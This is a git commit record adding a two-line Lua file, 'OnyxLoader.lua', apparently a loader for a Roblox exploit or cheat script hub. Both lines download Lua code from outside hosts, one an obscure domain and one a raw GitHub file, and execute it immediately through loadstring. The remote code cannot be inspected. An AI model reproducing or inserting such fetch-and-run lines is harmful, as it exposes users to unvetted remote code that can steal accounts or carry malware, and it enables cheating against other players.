34eece119513c2d3ddad6afa9a6a50e9b35a8d69
azurkxo <140209544+azurkxo@users.noreply.github.com>
2024-12-30 15:09:57 +0200

    Add files via upload

---
+++ OnyxLoader.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://egorikusa.space/21871ddb9f10ffd71d933d15.lua", true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
